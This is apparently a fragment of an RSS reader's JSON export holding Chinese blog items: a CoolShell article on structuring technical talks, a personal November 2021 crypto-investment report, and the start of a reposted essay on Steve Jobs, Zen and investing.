          "created": false,
          "tags": [],
          "hash": "d54581c3225a5df0cf5acd6878e72fd2",
          "highlights": []
        },
        {
          "title": "如何做一个有质量的技术分享",
          "description": "<p>分享信息并不难，大多数人都能做到，就算是不善言谈性格内向的技术人员，通过博客或社交媒体，或是不正式的交流，他们都能或多或少的做到。但是如果你想要做一个有质量有高...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/21589.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/21589.html\">如何做一个有质量的技术分享</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-medium\" src=\"https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169.jpeg\" alt=\"\" width=\"300\" height=\"169\" />分享信息并不难，大多数人都能做到，就算是不善言谈性格内向的技术人员，通过博客或社交媒体，或是不正式的交流，他们都能或多或少的做到。但是如果你想要做一个有质量有高度的分享，这个就难了，所谓的有质量和有高度，我心里面的定义有两点：1）分享内容的保鲜期是很长的，2）会被大范围的传递。我们团队内每周都在做技术分享，虽然分享的主题都很有价值，但是分享的质量参差不齐，所以，想写下这篇文章 。供大家参考。</p>\n<p>首先，我们先扪心自问一下，我们自己觉得读到的好的技术文章是什么？我不知道大家的是什么，我个人认为的好的文章是下面这样的：</p>\n<ul>\n<li><strong>把复杂的问题讲解的很简单也很清楚</strong>。比如我高中时期读到这本1978年出版的《<a href=\"https://book.douban.com/subject/1441922/\" target=\"_blank\" rel=\"noopener\">从一到无穷大</a>》，用各种简单通俗通懂的话把各种复杂的科学知识讲的清清楚楚。还有看过的几本很好的书，有一本是《<a href=\"https://book.douban.com/subject/5273955/\" target=\"_blank\" rel=\"noopener\">Windows程序设计</a>》，从一个hello world的程序开始一步一步教你Windows下的原生态编程。</li>\n<li><strong>有各种各样的推导和方案的比较，让你知其然知其所以然</strong>。有了不同方案的比较，才可能让人有全面的认识。这个方面的经典作著是《<a href=\"https://book.douban.com/subject/5387403/\" target=\"_blank\" rel=\"noopener\">Effective C++</a>》。</li>\n<li><strong>原理、为什么、思路、方法论会让人一通百通</strong>。这里面最经典的恐怕就是《<a href=\"https://book.douban.com/subject/5387403/\" target=\"_blank\" rel=\"noopener\">十万个为什么</a>》了，在计算机方面也有几本经典书，有《<a href=\"https://book.douban.com/subject/1467587/\" target=\"_blank\" rel=\"noopener\">Unix编程艺术</a>》、《<a href=\"https://book.douban.com/subject/1052241/\" target=\"_blank\" rel=\"noopener\">设计模式</a>》、《<a href=\"https://book.douban.com/subject/1230413/\" target=\"_blank\" rel=\"noopener\">深入理解计算机系统</a>》等书，以及《<a href=\"http://www.kegel.com/c10k.html\" target=\"_blank\" rel=\"noopener\">The C10K Problem</a>》等很多技术论文。</li>\n</ul>\n<p>其实，从教科书，到专业书，再到论文，都有上面这些不错的特质。<span id=\"more-21589\"></span></p>\n<p>所以，如果你想做一个好的技术分享的话，下面是我总结出来的方法，供你参考。</p>\n<ul>\n<li><strong>先描述好一个问题</strong>。这样能够听众带入进来，如果这个问题是他们感同身受的，那是最好了。千万不要一上来就说What，或是直接冲进答案里。这样的分享是在灌输和填鸭。把Why说清楚。没有Why，直接谈What的技术分享，通常来说价值不大。</li>\n<li><strong>How比What重要</strong>。在讲How的时候，也就是如何解这个问题。\n<ul>\n<li>先要把问题模型说清楚，有了问题模型这个框框后，方案才有意义。</li>\n<li>然后要有不同技术的比较。有了比较后，听众才会更相信你。</li>\n<li>直接上What的技术细节，其实没有太大意义。</li>\n</ul>\n</li>\n<li><strong>一定要有Best Practice或方法论总结</strong>，否则上不了档次的。也就是分享中大家可以得到的重要收获。</li>\n</ul>\n<p>说明了这个模型就是：<strong>问题 &#8211;&gt; 方案 &#8211;&gt; 总结。这其中是有一定的心理学模型的，具体表现如下：</strong></p>\n<ul>\n<li>用问题来吸引受众，带着受众来一起思考</li>\n<li>用问题模型来框住受众的思考范围，让受众聚焦</li>\n<li>给出几种不同的解决方案，比较他们的优缺点，让受众有一种解决问题的参与感。</li>\n<li>最后，给出最佳实践，方法论或套路，因为有了前三步的铺垫，受众欣然接受。</li>\n<li>整个过程会让受众有强烈的成长感和收获感。</li>\n</ul>\n<p>这里有几个示例，也是我在我司 MegaEase 内部的技术分享，供你参考（<a href=\"https://www.youtube.com/user/chenhaox/videhttps://www.youtube.com/channel/UCJhxX8SXcYdNWc6QMbWKs7Aos\" target=\"_blank\" rel=\"noopener\">我个人的YouTube频道</a>）</p>\n<p>技术分享：<a href=\"https://youtu.be/qB40kqhTyYM\" target=\"_blank\" rel=\"noopener\">Prometheus是怎么存储数据的</a>（Youtube）</p>\n<p><iframe loading=\"lazy\" title=\"技术分享：Prometheus是怎么存储数据的（陈皓）\" width=\"640\" height=\"360\" src=\"https://www.youtube.com/embed/qB40kqhTyYM?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></p>\n<p>技术分享：<a href=\"https://www.youtube.com/watch?v=VnbC5RG1fEo\" target=\"_blank\" rel=\"noopener\">Distributed Lock Manager</a>（Youtube）</p>\n<p><iframe loading=\"lazy\" title=\"技术分享：Distributed Lock Manager（陈皓）\" width=\"640\" height=\"360\" src=\"https://www.youtube.com/embed/VnbC5RG1fEo?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></p>\n<p>下面是我写在我们公司内的Knowledge Sharing中的Best Practice，供参考</p>\n<h2>Sharing Guideline</h2>\n<p>Please follow the following sharing protocols</p>\n<h3><a id=\"user-content-understand-sharing\" class=\"anchor\" href=\"https://github.com/megaease/team/tree/master/sharing#understand-sharing\" aria-hidden=\"true\"></a>Understand Sharing</h3>\n<ul>\n<li>Sharing is the hard way to learn knowledge. The presenter gains the biggest advantages. not audience. 分享是学习知识的最难的方式。分享者获得的好处最最多的，而不是观众。</li>\n<li>Sharing can open the knowledge door for the audience, but you have to walk to knowledge by yourself. 分享可以为听众打开知识的大门，但你能不能获得知识还要靠你自己。</li>\n</ul>\n<h3><a id=\"user-content-best-practices\" class=\"anchor\" href=\"https://github.com/megaease/team/tree/master/sharing#best-practices\" aria-hidden=\"true\"></a>Best Practices</h3>\n<p>To perform a great sharing, please follow the below practices.</p>\n<ul>\n<li>Do not share a big topic, a small topic is better. A big topic could make the audience lose focus. Remember, <a href=\"https://en.wikipedia.org/wiki/Minimalism#Minimalist_design_and_architecture\" rel=\"nofollow\">Less is More!</a></li>\n<li>Sharing time less than 60 mins is the best.</li>\n<li>English language for slides is preferred.</li>\n<li>While prepare the sharing contents, it&#8217;s better to discuss with the senior people to help you to see the whole picture, understand the good side and bad side, know what you don&#8217;t know &#8230; etc.</li>\n<li>Strong Recommend Materials Outlines\n<ul>\n<li>What&#8217;s the Problem?</li>\n<li>How to Solve the Problem?</li>\n<li>The Best Solution or Practice.</li>\n<li>The Mechanism, Key Techniques, and Source Code</li>\n<li>Pros/Cons</li>\n<li>References (Further reading)</li>\n</ul>\n</li>\n</ul>\n<blockquote><p>For example, if you want to sharing a topic about Docker. the following outlines would be good one:</p>\n<ul>\n<li>What&#8217;s the major problems need to solve. (Provision, Environment, Isolation etc.)</li>\n<li>The Alternative solutions. (Puppet/Chef/Ansible, VM, LXC etc.)</li>\n<li>The Best Solution &#8211; Docker. Why?</li>\n<li>Docker&#8217;s key techniques &#8211; image, cgroup, union fs, namespace&#8230;</li>\n<li>Docker&#8217;s Pros/Cons</li>\n<li>Further reading list.</li>\n</ul>\n</blockquote>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-full\" src=\"https://coolshell.cn/wp-content/uploads/2021/07/截屏2021-07-13-12.53.33.png\" alt=\"\" width=\"573\" height=\"173\" /></p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/22298.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png\" alt=\"聊聊团队协同和协同工具\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22298.html\" class=\"wp_rp_title\">聊聊团队协同和协同工具</a></li><li ><a href=\"https://coolshell.cn/articles/22173.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png\" alt=\"“一把梭：REST API 全用 POST”\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22173.html\" class=\"wp_rp_title\">“一把梭：REST API 全用 POST”</a></li><li ><a href=\"https://coolshell.cn/articles/22157.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg\" alt=\"谈谈公司对员工的监控\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22157.html\" class=\"wp_rp_title\">谈谈公司对员工的监控</a></li><li ><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png\" alt=\"程序员如何把控自己的职业\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_title\">程序员如何把控自己的职业</a></li><li ><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg\" alt=\"MegaEase的远程工作文化\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_title\">MegaEase的远程工作文化</a></li><li ><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg\" alt=\"别让自己“墙”了自己\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_title\">别让自己“墙”了自己</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21589.html\">如何做一个有质量的技术分享</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "技术读物",
          "link": "https://coolshell.cn/articles/21589.html",
          "creator": "陈皓",
          "pubDate": "Tue, 13 Jul 2021 05:00:46 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "3938a19753619fb34c286491125b3bc1",
          "highlights": []
        }
      ],
      "folder": "rip",
      "name": "coolshell",
      "language": "zh",
      "hash": "8d8ec17e504b06b2d1404492c3b1ee6a"
    },
    {
      "title": "DHTalk's Blog",
      "subtitle": "Stay hungry Stay foolish.",
      "link": "",
      "image": null,
      "description": "",
      "items": [
        {
          "title": "2021年11月投资月报：熊市传闻",
          "description": "\n    \n      <p>市场有意思的地方就在于：10 月份暴涨的时候人人都喊牛来了，让大家抓紧时间冲冲冲。随着 11 月第一周的上涨结束，我们迎来了 11 月的市场回调阶段，虽然下跌幅度没有太高，但市场又充斥着熊市来了的声音。</p>\n<p><img src=\"/blogimg/202111300\n    \n    ",
          "content": "<p>市场有意思的地方就在于：10 月份暴涨的时候人人都喊牛来了，让大家抓紧时间冲冲冲。随着 11 月第一周的上涨结束，我们迎来了 11 月的市场回调阶段，虽然下跌幅度没有太高，但市场又充斥着熊市来了的声音。</p>\n<p><img src=\"/blogimg/2021113001.png\" alt=\"2021113001.png\"></p>\n<p align=\"center\">↑ BTC 月线走势</p>\n\n<h2 id=\"收益统计\"><a href=\"#收益统计\" class=\"headerlink\" title=\"收益统计\"></a>收益统计</h2><p><img src=\"/blogimg/2021113002.JPEG\" alt=\"2021113002.JPEG\"></p>\n<p align=\"center\">↑  期货和长期账户收益</p>\n\n<p>截止到 11/30 23:36，『期货』账户时间加权收益率为 <code>-99.51%</code>，年化收益率是 <code>-38.33%</code>。</p>\n<p>时间加权收益率较上月增长 <code>+0.11%</code>，年化收益率较上月增长 <code>+16.33%</code>。</p>\n<p>『长期主义』账户时间加权收益率为 <code>+63.24%</code>，年化收益率暂无。</p>\n<p>时间加权收益率增长 <code>-6.44%</code>，年化收益率暂无。</p>\n<p>本月在有知有行隐藏了已经清零的账户，将 Pionex 账户的资金转移至期货账户，目前月报只保留期货账户和长期账户收益统计。本月期货账户稍有盈余，长期主义账户主要配置仓位为 BTC，收益和 BTC 价格走势高度相关。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>本月市场情绪变化是一个有意思的点，继续看牛市场的人有很多看多的理由，看空市场的人也都有看空的理由。在本月缓慢却又让人心烦的下跌中我也有所怀疑市场是否已经走熊。</p>\n<p>但我在分析解读那么多链上数据以后显示现在还没有到牛市逃顶阶段，市场缺乏一次 FOMO，大家很冷静，甚至很多人做空盈利了，这完全不像牛市疯狂后一地鸡毛的样子。</p>\n<p>密切关注链上数据，FOMO 上涨可能很快就要出现。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/11/30/investment2111/",
          "creator": "",
          "pubDate": "2021-12-01T10:01:06.580Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/11/30/investment2111/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": true,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "8eadb0e2fd4507ec1d15dde6006a555c",
          "highlights": []
        },
        {
          "title": "「转」乔布斯：禅与投资！心力即人生！",
          "description": "\n    \n      <h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>乔布斯是当世最伟大的企业家之一，同时也是一名虔诚的禅宗教徒。他少有慧根，17岁那年，他远赴印度寻找圣人寻求精神启蒙，18岁那年，他开始追随日\n    \n    ",
          "content": "<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>乔布斯是当世最伟大的企业家之一，同时也是一名虔诚的禅宗教徒。他少有慧根，17岁那年，他远赴印度寻找圣人寻求精神启蒙，18岁那年，他开始追随日本禅师乙川弘文学习曹洞宗的禅法，从此禅深刻影响了他的一生。</p>\n<p>乔布斯后来回忆说：</p>\n<p>“与乙川弘文的碰面对我来说是一段意义非凡的经历，我后来尽可能多地与他待在一起。”</p>\n<p>据乔布斯的前女友布伦南（乔布斯的孩子丽莎的妈妈，和乔布斯一起跟随乙川弘文学禅多年）的传记《苹果的缺口》有大量乔布斯跟随乙川弘文学禅的细节，她回忆说，乙川弘文对乔布斯非常满意，曾经对她说：“我的弟子中从来没有人可以在这么短的时间内掌握佛学——三个月，没有人能比这个时间更短。”乙川弘文对乔布斯帮助很大，经常给他的生活和工作提供建议，布伦南回忆说：</p>\n<p>​“一位禅师成了他的后盾。”<br>​<br>​“和弘文的合作，史蒂夫的事业也取得了巨大的进步。”</p>\n<p>​“弘文的修为发展可谓令人难以置信的高深。”</p>\n<p>一位真正的精神大师，他帮助一个年轻的创业者成功地开发出了改变世界的科技，这样的事情在世界历史中都很罕见。”</p>\n<p>乙川弘文也主持了乔布斯的佛教婚礼。乔布斯终生坚持打坐禅修，直到年老工作太忙的时候才有所暂停，他说禅的直觉思维对他的工作影响很大，很多事情他都是用直觉进行判断。他所设计的产品如iPhone、iPod、MacBook简洁优雅，深得禅意之美。《乔布斯传》作者沃尔特在书里写道：</p>\n<blockquote>\n<p>“乔布斯对东方精神，尤其是佛教禅宗的信奉，并不是心血来潮或年轻人的一时冲动。他投入了他特有的那种激情，这些东西也在他的性格中根深蒂固。”</p>\n</blockquote>\n<p>乔布斯的葬礼采用的也是佛教仪式。</p>\n<p>什么是禅，禅是梵语“禅那”的简写，意思是静虑，最早源于印度，乔布斯所修的禅法属于曹洞宗，源于六祖惠能，六祖认为人人心中都有佛性，通过禅修，一旦明心见性，即可顿悟成佛。乔布斯一生精进修行，禅对他的影响表现在什么方面？他的境界如何？乔布斯生前并没有做总结，出于对乔布斯和禅的热爱，我一直都在努力思索这个问题，希望可以汲取乔布斯的智慧用于指导我们的实践。</p>\n<p>半年前的一天读到《乔布斯传》第十一章里的几段话，我突然豁然开朗，深受启发。书里写道：</p>\n<blockquote>\n<p>“史蒂夫拥有现实扭曲力场。”“有他在的时候，现实都是可塑的，他能让任何人相信几乎任何事情，等他不在的时候，这种力场就会逐渐消失。”“陷入史蒂夫的扭曲力场是一件很危险的事情，但是正是这种力场让他可以真正地改变现实。”</p>\n</blockquote>\n<p>乔布斯拥有一种神秘的无比强大的力场，强大到足以改变现实，不就是禅所说的“心生万法”吗？这种力量，来自内心。当代高僧一行禅师有一本书叫《心力》，里面写道，每个人的内心都拥有强大到不可思议的力量，能否把这种力量充分开发出来要靠个人的修炼，而乔布斯则把心力修炼到了登峰造极的程度。我隐约感到，研究乔布斯如何把心力修炼到如此强大，可能是探索乔布斯禅学境界的一把很好的钥匙。</p>\n<p>随着深入研究乔布斯的各种资料，包括各种传记、讲稿、视频，我逐步意识到，乔布斯强大的心力，是多层次的，不仅仅包括他勇于颠覆世界、无所畏惧的“愿力”，还包括他一往无前、如激光般聚焦的“专注力”，源源不断、无中生有的“创新力”，以及超越表象、洞察本质的“洞察力”，这四种力量聚合在一起形成强大无比的合力，强大到一次又一次颠覆这个世界，强大到不仅苹果员工还有全世界的果粉们都能强烈地感受到。</p>\n<p>心力中的愿力、专注力、创新力和洞察力各是什么？和禅有什么关系？在研究不断深入的过程中，我发现每一种力的内涵和外延都非常丰富，除了乔布斯和苹果，我也选择了很多其他公司和人的案例来佐证一些观点，其中引用比较多的是稻盛和夫的案例[稻盛和夫是日本备受推崇的经营之神，一生中创立了两家世界五百强企业（京瓷和KDDI电讯），并在金融危机时拯救了另一家世界五百强企业（日航航空），他也是一名著名的禅宗信徒]，研究的初衷也从单纯探讨乔布斯禅的领悟，进化到探讨心力与禅的关系以及更进一步，古老的禅如何融入现代社会并指导我们的实践，尤其是投资实践。</p>\n<p>在正式展开论述之前，我想对禅再作进一步的介绍。我用对比的方法，六祖的禅比原始佛教有了重大的突破，原始佛教最关心的是解脱，修行的方法是禅定，主要是坐禅，六祖在《坛经》中有一句话非常重要，他说此法门“唯论见性，不论禅定解脱”，也就是说原始佛教最关心的那些东西，他好像都不太关心，其实他也关心，不过从修行路径来说他最关心的是我们要修炼内心，如果我们真明白了我们的心性，我们就能证悟佛法，就能解脱。之前佛远在西天，六祖之后，佛就在我们心中，这个法门，非常强调我们对心的修炼。我们的内心里蕴藏着巨大的智慧和能量，但这需要我们开发，怎么开发呢？这个演讲就是想提供一些思路。</p>\n<p>所谓禅，六祖的禅，可以理解为探索心的一种法门，如果我们了解我们的心，我们对这个世界会有全新的认识，而且我们就知道如何开创自己的未来，所谓禅可能就是这样一种东西。在本文附录《轮回真的存在吗？》里面，通过对轮回法理的分析，以及对六祖“不论禅定解脱”内涵的剖析，我们会明白禅证悟的是真理本身，源自于宗教，而又超越了宗教。</p>\n<p>下面我分两部分，第一部分论述我对这四种心之力的理解，第二部分是结合心力这个概念，比较系统地阐述心力禅的几个重要见地。</p>\n<h2 id=\"第一部分-心之四力\"><a href=\"#第一部分-心之四力\" class=\"headerlink\" title=\"第一部分 心之四力\"></a>第一部分 心之四力</h2><h3 id=\"一、愿力\"><a href=\"#一、愿力\" class=\"headerlink\" title=\"一、愿力\"></a>一、愿力</h3><p>愿力，原来是佛教用语，誓愿的力量，借用到今日语境，是指人长远的强烈的追求。地藏王菩萨愿力很大：“地狱不空，誓不成佛。”我们普通人的愿力和我们的人生是一种什么样的关系，稻盛和夫有精彩的论述，他说：</p>\n<p>“我坚定一个信念，那就是‘内心不渴望的东西，它就不可能靠近自己。’亦即，你能实现的，只能是你自己内心渴望的东西，如果内心没有渴望，即使能实现的梦想也实现不了。”</p>\n<p>“我希望人们能铭记这个宇宙法则，那就是：人生与心念一致，强烈的意愿将以一定的现象表现出来。也许有人断定此言极其神秘不予接受，但是，这是我在此前的人生中多次体验后确信不疑的不二法门。”</p>\n<p>“如果用20年、30年或更长的时间来看的话，大多数人的一生就是他们自己曾经在意念中描绘过的。”</p>\n<p>我把稻盛和夫的话总结一下，就是五个字“愿力即人生！”</p>\n<p>不是“愿力决定人生”，而是更直截了当的“愿力即人生！”</p>\n<p>乔布斯的人生追求是“改变世界”，当年他劝说百事可乐总裁来担任苹果CEO的时候所说的话：“你是愿意一辈子卖糖水，还是跟我一起改变这个世界？”激励了无数心怀梦想的朋友，通过那则著名的广告《think different》他告诉世人：“因为只有那些疯狂到以为自己能够改变世界的人，才能真正地改变世界。”乔布斯确实改变了世界，而且不是一次，是五次，他强大的疯狂的愿力成就了他传奇的一生。</p>\n<p>我有一位做投资的朋友，学习佛法后，有一天和我说：“我学佛越学越困惑，佛法说人生不过是场幻象，还说执著是人生痛苦烦恼的根源，我这么努力投资赚钱，还想成为巴菲特，这应该是一种执著吧？我是不是在自寻烦恼？”这位朋友的困惑非常有代表性，和我们探讨的人生追求即愿力有直接的关系。为了开导他，我和他讨论了两个问题。</p>\n<p>首先人生是不是一场幻象？</p>\n<p>佛陀证悟后发现，人自身，和世间的一切现象都一样，只是一些因缘（条件）的聚合，很不稳定，人一生的际遇，不是自己想怎么样就能怎么样，我们当下所拥有的健康、美貌、财富、地位等随着条件改变，也会跟着改变，甚至严重受损，人生沉沉浮浮，动荡不安，因此，人的一生，就像一个幻象。</p>\n<p>这确实是一个很形象的比喻，不过也仅仅是一个比喻而已，后世佛教的一些人，把这个比喻当“真”了，而且还进一步极端化了，认为“自我”的一生根本就不是真实的，他们有一种解释是说这个“自我”和内部的各个部分、以及外部都有联系，不是独立存在的，因此“自我”就是不真实的，这种解释很牵强，和普通人按常识或者共识所理解的“真实”是两回事（一般理解的“真实”是“在某一个时点确定客观地存在，而不是虚构或者凭空想象”），这种极端化的解释流传很广，但并非佛陀的原意，佛陀从来没有说生命是不真实的，当下这一刻，“自我”是真实存在的，不过这个“自我”，在下一个当下，可能就会发生变化，但是不能因为“自我”未来可能会发生变化，就否定“自我”当下的真实存在。</p>\n<p>无数个曾经的“当下”连在一起，构成了我们至今为止的一生，而下一个“当下”，则充满了无限可能。</p>\n<p>人的一生，从出生到死去，总的存在时间虽然只有几十年，如露如电，但是在这段短暂的时间里，“自我”的存在是真实的，不是想象或者虚构出来的，否则我们讨论人生追求，或者叫抱负、雄心、使命就毫无意义了。</p>\n<p>佛陀说生命如幻象是提醒我们要用动态的、变化的眼光去看待生命的存在。“真实”或者“幻象”这种概念确实很容易产生文字上的歧义，我认为可以这样清晰地总结，当下是真实的，过程有如幻象。</p>\n<p>第二个问题是佛法说的执著到底是什么意思？</p>\n<p>我们普通人努力工作有所追求，肯定会涉及到金钱名誉地位等所谓世俗意义的成功，是不是就是一种执著，从而产生无尽烦恼？</p>\n<p>实际上，人生有所追求，愿意付出努力去实现，是非常美妙的感觉，甚至可以说是幸福的源泉，也是我们能够对社会作出贡献的主要方式。巴菲特太热爱投资太热爱赚钱了，他非常快乐以至他说他每天都是踩着踢踏舞步去上班的，没听他说由于赚钱而苦恼万分，相反一个人无所事事，往往非常痛苦。</p>\n<p>佛法说不要执著，不是说努力工作有所追求，包括世俗意义的成功本身有什么不对，而是说我们所追求的这些东西，如果情况发生变化，尤其是不好的变化的时候，我们不要执著于之前的状态，而是要接受现实并欣然面对，如果执著于之前的状态，无法接受变化，这才是执著，这才是烦恼的根源，佛陀说人要有“出离心”，不是指出离这种追求，而是出离这样的一种执著。再重复一次，努力工作追求成功和佛法说的执著没什么关系，不能接受改变那才叫执著，才是烦恼的根源。</p>\n<p>我的朋友有这种困惑，不是个别现象，而是相当普遍的现象，他们没有弄明白入世修行的方法和出世修行的方法是不一样的。</p>\n<p>出家人为了避免“执著”而产生烦恼，他们选择了一种普通人觉得极端的一种方法，就是舍弃大部分的尘世中的欲望，没有追求也就没有失去，没有失去也就不存在因失去而执著，但是这种方法也会带来新的烦恼。</p>\n<p>普通人在红尘欲望中修行同样可以有非凡成就，佛经里境界极高的维摩诘居士就是在家修行，六祖惠能就非常鼓励大家在世间修行，他说：“佛法在世间，不离世间觉，离世觅菩提，恰如求兔角。”由于修行环境的极大差异，普通人的修行法门当然和出家人截然不同，但无分高下，工作生活就是他们最好的修炼道场。</p>\n<p>禅的理论学习并不困难，但这只是万里长征的第一步，最重要的是，我们要在日常实践中证悟，如何证悟，后面几章我会介绍在实践中证悟的三种方法。现在出了很多佛学书，内容也在积极入世，但有真知灼见，能真正启迪智慧并用于指导实践的非常少，绝大多数是用出家人超脱凡尘的心态指导压力巨大的普通人的工作生活，打个比方，就像一个生活在北极的爱斯基摩人，用他的生活经验，来指导一个生活在赤道的非洲人如何干得更好，怎么能令人信服呢？</p>\n<p>在世间修行，愿力同样可以很高远，同样可以慈悲为怀，造福社会，普度众生，也就是行“菩萨道”。稻盛和夫用他一生的所作所为给我们作出了表率，他创办的京瓷的经营理念是：“在追求全体员工物质和精神两方面都获得幸福的同时，为人类社会的进步和发展作出贡献。”他非常强调“把利他作为经营的出发点。”在做许多经营决策时，他会反复自问自己的动机，是否混杂了私心。</p>\n<p>1982日本政府为打破国营电讯公司的垄断，允许私人资本参与电讯行业，他就打算创办DDI电讯（日本第二大电讯公司KDDI的前身），但他并不着急马上报名，他说：</p>\n<blockquote>\n<p>“每晚就寝前，我必定审视自己的参加意图，你加入电气通信事业真是为了国民吗？是否混杂了为公司或个人谋利益的私心？或者是为了受到社会的关注而自我表现呢？动机是否纯粹，没有一丝污点？”“半年后，我终于确信自己毫无私心，于是，下决心成立了DDI公司。”</p>\n</blockquote>\n<p>稻盛和夫这么说，我相信是真的，DDI公司创立的时候，他是创始人，是可以持有很多股份的，但是他最终的选择是连一股都不曾持有，因为他不想掺杂任何私心。个人如何在工作中精进修行，而不是深山古庙里修行，稻盛和夫给我们作了最好的示范。稻盛和夫和乔布斯一生对社会贡献巨大，所造功德，何异于高僧，所以我们说，入世与出世，皆可修行，殊道而同归，看似有别，其实不二。</p>\n<p>有一个古老的问题一直非常困扰人，那就是我们在世间有所追求，是不是有个度的问题。在这个度以内就是合理的，超过了就是贪得无厌从而滋生无穷烦恼，其实我们应该超越“度”去思考这个问题，如果一个人秉承“行菩萨道”的精神、合理合法去追求成功，那么他越有成就，就越能帮助世人，对这个社会贡献也越大，这是功德无量、天人共庆、皆大欢喜的事情。</p>\n<p>自我设限是没有意义的，有些人觉得小成即安，知足即安，这种选择也没什么不对，但有人选择毕生不懈努力，永无止境地探索，如乔布斯、稻盛和夫，他们的境界早已超越了对财富名利的追求，那更值得全社会的尊重。烦恼事关执著，而执著与所谓“度”并不直接相关。有烦恼了，我们需要反省的不是所谓“度”这个问题，而是我们对待变化的态度。</p>\n<p>愿力大的人，意志力自然强大，遇到困难不逃避，勇往直前，百折不挠。乔布斯是个好例子，1985年他被自己亲手找的职业经理人赶出了自己亲手创办的公司，这打击太大了，他一度非常沮丧和失落，他后来回忆说：</p>\n<blockquote>\n<p>“虽然我被驱逐了，但是我仍然钟爱我所做的事情。所以我决定从头再来。”</p>\n</blockquote>\n<p>他很快就又创立了一个名叫NeXT的电脑公司，NeXT公司后来被苹果公司收购，让他有机会得以重返苹果，从而再创巅峰。另外，愿力大的人，心如强磁，会对他的追随者有致命的吸引力。</p>\n<p>乔布斯著名的“现实扭曲力场”的那个力，我觉得主要包括两种力，其中一种是心力中的愿力，他的愿力太强大了，所呈现出来的火山爆发一般的激情、无坚不摧的信心、势不可挡的勇气深深地震撼了所有的人，让全世界最有能力、最有激情的一群天才们对乔帮主趋之若鹜，齐心协力，帮助乔布斯一次又一次颠覆这个世界。我们看现实中，一个公司的创始人只有愿力大，人才才会纷纷投奔，如果愿力太小，根本就留不住人。</p>\n<p>你的追求是什么？你的愿力有多大？再换一个角度思考，就是你想成为一个什么样的人。这个问题困扰着很多人，他们会热衷听取父母朋友的意见，或者了解现在的高薪职业是什么等等来寻求答案，乔布斯的忠告是：</p>\n<p>“不要被其他人喧嚣的观点掩盖你真正的内心的声音。”“最重要的是，你要有勇气去跟随你直觉和心灵，因为它们在某种程度上已经知道你想要成为什么样的人。所有其他的事情都是次要的。”</p>\n<p>你今天的生活，就是你此生想过的吗？</p>\n<p>乔布斯说：</p>\n<blockquote>\n<p>“每个早晨，我都会对着镜子问自己：“如果今天是我生命中的最后一天，你会不会完成你今天想做的事情呢?”如果连续几天的答案都是“不”的时候，我知道我要做些改变了。”</p>\n</blockquote>\n<